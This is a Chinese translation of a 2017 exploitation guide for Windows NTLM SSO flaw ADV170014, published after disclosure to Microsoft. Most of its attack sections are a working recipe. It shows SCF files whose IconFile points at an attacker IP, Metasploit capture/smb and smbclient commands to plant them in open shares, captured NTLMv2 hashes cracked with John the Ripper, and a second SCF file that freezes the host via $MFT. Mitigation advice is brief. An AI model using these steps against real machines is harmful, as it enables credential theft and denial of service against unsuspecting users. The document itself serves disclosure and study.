# 【技术分享】ADV170014 NTLM SSO：利用指南

阅读量 **133444**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-10-27 10:57:50

 **x**

##### 译文声明

本文是翻译文章，文章来源：sysadminjd.com

原文地址：<http://www.sysadminjd.com/adv170014-ntlm-sso-exploitation-guide/>

译文仅供参考，具体内容表达以及含义原文为准。

译者：[興趣使然的小胃](http://bobao.360.cn/member/contribute?uid=2819002922)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**  
**

**一、前言**

2017年10月，微软在周二补丁日公布了一份安全公告（ **ADV170014** ），这份安全公告中提到了 **NTLM**
身份验证方案中的一个漏洞，恶意攻击者可以利用这个漏洞来窃取哈希，远程冻结受影响的主机。

我在2017年5月24日报告了这个漏洞，微软于2017年10月18日正式结束了该漏洞处理周期。

因此，微软总共花了148天来检查这个问题。

在10月份的周二补丁日之后，我公开了漏洞的详细信息，既然官方已经公布这个漏洞的“解决方案”，现在系统管理员可以在注册表上使用补丁来修复漏洞（前提当前环境可以使用这个补丁），后面我们会详细介绍这一点。

**二、漏洞概要**

众所周知，微软的NTLM架构中存在一些缺陷，哈希窃取并不是一门新的技术，渗透测试人员在攻击微软环境时，首先就会尝试哈希窃取技术。

然而，这些技术大多数都需要用户参与其中，或者需要拦截流量才能完成攻击流程。

本文介绍的这种新的攻击方法完全不需要用户交互，所有操作都可以在攻击者这端完成，当然，为了成功实施攻击，必须满足某些条件。

**三、攻击场景**

若要实施攻击，目标主机上必须存在没有设置密码保护的一个共享文件夹，这种场景非常常见，比如办公室、学校、医院以及大多数Windows环境中，人们都会通过共享文件夹来共享音乐、照片以及文档。

举个例子，用户“Juan”在他的桌面上创建了一个文件夹，名为“Pruba2”，他想把这个文件夹共享给他的团队使用。

现在，转到“Sharing（共享）”选项卡窗口，修改目录属性，允许用户不使用密码来查看这个共享文件夹。

在这个对话框中，我们可以看到共享文件夹的具体路径，为“\JUAN-PCUsersjuanDesktopprueba2”。

现在，点击“Network and Sharing center（网络和共享中心）”。

如上图所示，点击“Turn off password protected
sharing（关闭密码保护共享）”选项，这样一来，任何用户就可以访问这个共享文件夹，无需身份验证。

**四、SCF文件**

微软在Windows 3.11时引入了 **SCF** 文件。SCF文件其实是纯文本文件，可以用来指导Windows文件资源管理器执行一些基本任务。

现在已经有一些基于SCF的攻击手段，但到目前为止，所有的这些攻击方法都需要用户参与才能执行SCF文件。

我们找到了近期使用的两个例子，来自Defense Code的Bosko Stankovic在一篇文章中介绍了如何使用Google
Chrome浏览器窃取Windows凭据信息，2015年的黑帽大会上，Jonathan Brossard以及Hormazd
Billimoria演示了使用SMB的一种攻击方法（请参考：“SMB:共享的不仅仅是你的文件”）。

基本的SCF文件结构如下所示：

    
    
    [Shell]
    Command=2
    IconFile=\192.168.1.101sharetest.ico
    [Taskbar]
    Command=ToggleDesktop

文件结构就是这么简单。值得一提的是，SCF文件表面上看起来比较简单，实际上这个Windows功能非常复杂，并且几乎不存在相关的参考文档。

**五、窃取哈希**

在攻击演示场景中，我们准备使用 **Metasploit** 工具，所使用的SCF文件内容如下所示：

    
    
    root@sysadminjd:~# cat test.scf
    [Shell]
    Command=2
    IconFile=\192.168.1.111sharetest.ico
    [Taskbar]
    Command=ToggleDesktop
    root@sysadminjd:~#

我们所使用的攻击主机IP地址为192.168.1.111，在攻击主机上，我们运行着capture/smb Metasploit模块：

    
    
    root@sysadminjd:~# msfconsole -q
    msf > use auxiliary/server/capture/smb
    msf auxiliary(smb) > set JOHNPWFILE /tmp/smbhash.txt
    JOHNPWFILE = /tmp/smbhash.txt
    msf auxiliary(smb) > exploit -j
    [*] Auxiliary module running as background job
         
    [*] Server started.
    msf auxiliary(smb)

因为我们准备使用John the
Ripper来破解捕获的哈希，所以我们需要在上述命令中设置JOHNPWFILE选项，将其指向/tmp/smbhash.txt，该文件用来保存已捕捉到的哈希值。

此时，Prueba2目录中空空如也，想要攻击成功的话，我们需要往里面添点东西。

一切准备就绪后，我们需要将SCF文件上传到受漏洞影响的这个目录中，此时我们可以使用各种方法，比如通过OSX
Finder、Windows资源管理器来上传文件，这里我们使用的是smbclient这个命令行工具。

    
    
    root@sysadminjd:~# smbclient //192.168.1.67/Users
    WARNING: The "syslog" option is deprecated
    Enter root's password:
    OS=[Windows 7 Ultimate 7601 Service Pack 1] Server=[Windows 7 Ultimate 6.1]
    smb: > cd juan
    smb: juan> cd Desktop
    smb: juanDesktop> cd prueba2
    smb: juanDesktopprueba2> put test.scf
    putting file test.scf as juanDesktopprueba2test.scf (88.9 kb/s) (average 88.9 kb/s)
    smb: juanDesktopprueba2> ls
    . D 0 Mon Oct 23 12:27:15 2017
    .. D 0 Mon Oct 23 12:27:15 2017
    .DS_Store AH 6148 Tue May 23 17:29:03 2017
    test.scf A 91 Mon Oct 23 12:27:15 2017
    6527487 blocks of size 4096. 4043523 blocks available
    smb: juanDesktopprueba2>
    root@sysadminjd:~#

随后，这个目录中出现了我们上传的SCF文件。

一切顺利的话，此时我们的Metasploit控制台中会出现如下信息：

    
    
    msf auxiliary(smb) >
    [*] SMB Captured - 2017-10-23 12:27:15 -0400
    NTLMv2 Response Captured from 192.168.1.67:49163 - 192.168.1.67
    USER:juan DOMAIN:juan-PC OS: LM:
    LMHASH:Disabled
    LM_CLIENT_CHALLENGE:Disabled
    NTHASH:47894338d99abe2f08e2c693618c7323
    NT_CLIENT_CHALLENGE:0101000000000000d0046aca1b4cd301d755c3756d5639d800000000020000000000000000000000
    [*] SMB Captured - 2017-10-23 12:27:15 -0400
    NTLMv2 Response Captured from 192.168.1.67:49163 - 192.168.1.67
    USER:juan DOMAIN:juan-PC OS: LM:
    LMHASH:Disabled
    LM_CLIENT_CHALLENGE:Disabled
    NTHASH:e97b70559f29462e2ca221d31113b9ca
    NT_CLIENT_CHALLENGE:0101000000000000a0177dca1b4cd301f59d5c5d52708e3b00000000020000000000000000000000
    [*] SMB Captured - 2017-10-23 12:27:15 -0400
    NTLMv2 Response Captured from 192.168.1.67:49163 - 192.168.1.67
    USER:juan DOMAIN:juan-PC OS: LM:
    LMHASH:Disabled
    LM_CLIENT_CHALLENGE:Disabled
    NTHASH:eb8b228b739cc95a12d7e0d89d89e002
    NT_CLIENT_CHALLENGE:0101000000000000620389ca1b4cd3017283fc96884767b700000000020000000000000000000000
    [*] SMB Captured - 2017-10-23 12:37:09 -0400
    NTLMv2 Response Captured from 192.168.1.67:49164 - 192.168.1.67
    USER:juan DOMAIN:juan-PC OS: LM:
    LMHASH:Disabled
    LM_CLIENT_CHALLENGE:Disabled
    NTHASH:4abb0803c4afd1509bfca3bbc566ad70
    NT_CLIENT_CHALLENGE:010100000000000076d7742c1d4cd30161b2c77a54bd58fe00000000020000000000000000000000
    [*] SMB Captured - 2017-10-23 12:37:09 -0400
    NTLMv2 Response Captured from 192.168.1.67:49164 - 192.168.1.67
    USER:juan DOMAIN:juan-PC OS: LM:
    LMHASH:Disabled
    LM_CLIENT_CHALLENGE:Disabled
    NTHASH:5eeb82aab85e9663624aaf6500e4d8f8
    NT_CLIENT_CHALLENGE:010100000000000046ea872c1d4cd301c7a724adf323918c00000000020000000000000000000000
    [*] SMB Captured - 2017-10-23 12:37:09 -0400
    NTLMv2 Response Captured from 192.168.1.67:49164 - 192.168.1.67
    USER:juan DOMAIN:juan-PC OS: LM:
    LMHASH:Disabled
    LM_CLIENT_CHALLENGE:Disabled
    NTHASH:55a0cb725a5a171cffdccea36fdcd934
    NT_CLIENT_CHALLENGE:010100000000000054118f2c1d4cd301f718b1ba2d4efc7800000000020000000000000000000000

如上所示，只需要一个简单的上传操作，就能触发多次身份认证请求，因此我们不用担心拿不到数据。

现在，在攻击主机上我们已经捕获到一些哈希值，接下来我们可以使用John来暴力破解明文密码。

    
    
    root@sysadminjd:~# cd /tmp/
    root@sysadminjd:/tmp# john smbhash.txt_netntlmv2
    Using default input encoding: UTF-8
    Rules/masks using ISO-8859-1
    Loaded 6 password hashes with 6 different salts (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
    Press 'q' or Ctrl-C to abort, almost any other key for status
    abc (juan)
    abc (juan)
    abc (juan)
    abc (juan)
    abc (juan)
    abc (juan)
    6g 0:00:00:00 DONE 2/3 (2017-10-23 12:27) 75.86g/s 404596p/s 585124c/s 585124C/s abc
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed
    root@sysadminjd:/tmp#

John成功恢复了明文密码，看起来“juan”用户使用了弱口令“abc”。

**六、冻结目标主机**

在第二种攻击场景中，我们可以远程冻结目标主机，来看看具体操作步骤。

我们还是需要存在漏洞的一个文件夹，这里我们直接使用了前面那个文件夹，同样，我们也需要使用一个SCF文件，文件内容与上一个文件相比有点区别。

    
    
    root@sysadminjd:~# cat mft.scf
    [Shell]
    Command=2
    IconFile= c:$MFT123
    [Taskbar]
    Command=ToggleDesktop
    root@sysadminjd:~#

这个SCF文件中引用了$MFT，这个字符串可以锁定NTFS文件系统，已经有一篇文章介绍过这个技术（西班牙语写的，阅读起来可能有点麻烦），你也可以在互联网上搜搜关于这方面的参考资料。

现在，我们可以使用smbclient将该SCF文件上传到存在漏洞的主机上。

    
    
    root@sysadminjd:~# smbclient //192.168.1.67/Users
    WARNING: The "syslog" option is deprecated
    Enter root's password:
    
    OS=[Windows 7 Ultimate 7601 Service Pack 1] Server=[Windows 7 Ultimate 6.1]
    
    smb: Z cd
    
    Default desktop.ini juan Public
    
    smb: &amp;gt; cd juanDesktopprueba2
    smb: juanDesktopprueba2&amp;gt; ls
    . D 0 Wed May 24 18:08:34 2017
    .. D 0 Wed May 24 18:08:34 2017
    .DS_Store AH 6148 Tue May 23 17:29:03 2017
    1.exe A 7168 Tue May 23 17:29:03 2017
    prueba.scf A 92 Wed May 24 18:08:34 2017
         
    6527487 blocks of size 4096. 4156104 blocks available
         
    smb: juanDesktopprueba2&amp;gt; put mft.scf
    putting file mft.scf as juanDesktopprueba2mft.scf (17.6 kb/s) (average 17.6 kb/s)

整个过程就是这么简单，从现在起，攻击者或目标用户不需要再做什么操作，目标主机会锁定文件系统，直至重启。

**七、影响范围**

根据微软的说法，从Windows 3.11开始到Windows 10的所有Windows版本（包括桌面版以及服务器版）都会受到这种攻击影响。

实话实说，我只在Windows 7以及Windows 10上测试过这种攻击方法，然后我就把皮球踢给微软，由他们负责处理后续事宜 🙂

**八、防御措施**

微软为这个漏洞提供了一个补丁程序，这个补丁会修改两项注册表键值，以禁用系统上的NTLM机制。只有Windows 10以及Windows Server
2016上才有这些注册表键值，并且看起来微软并不想将这种机制移植到其他版本的Windows系统。

另一个问题是，禁用NTLM会破坏已有的许多环境，这一点不容忽视。

我的建议是使用强度较高的密码。实施攻击后，我们需要破解已捕获的哈希，如果密码非常复杂，破解过程可能需要很长时间，让攻击者举足无措。

更好的办法是，不要设置没有密码的共享文件夹，这样做就能免受此类攻击。

**九、致谢及总结**

这个漏洞已经存在很长一段时间，我在渗透测试任务中使用这个漏洞已将近一年的时间。

漏洞原理非常简单，几乎每个人都可以加以利用。好消息是，想要成功利用这个漏洞必须满足一些条件，使用默认配置的Windows不会受此漏洞影响。

感谢微软安全响应中心（MSRC），他们付出了许多心血，同时也提供了一个补丁修复了部分操作系统上存在的漏洞。想在不破坏Windows系统完整性的同时，提供完整补丁以适配所有版本的操作系统，这一点不大现实。

来自Defense Code的Bosko Stankovic发表了一篇文章介绍如何使用Chrome浏览器窃取Windows凭据，黑帽大会上Jonathan
Brossard和Hormazd Billimoria演示了如何利用SMB发起攻击，他们的研究成果非常优秀，没有他们的帮助，我很难实现这个漏洞利用技术。

再次感谢读者阅读本文。

本文翻译自sysadminjd.com [原文链接](http://www.sysadminjd.com/adv170014-ntlm-sso-exploitation-guide/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **興趣使然的小胃** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/87094](/post/id/87094)

安全客 - 有思想的安全新媒体

本文转载自: [sysadminjd.com](http://www.sysadminjd.com/adv170014-ntlm-sso-exploitation-guide/)

如若转载,请注明出处： <http://www.sysadminjd.com/adv170014-ntlm-sso-exploitation-guide/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p1.ssl.qhmsg.com/dm/200_200_100/t0104d1b8b4ca36e961.jpg) 興趣使然的小胃

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

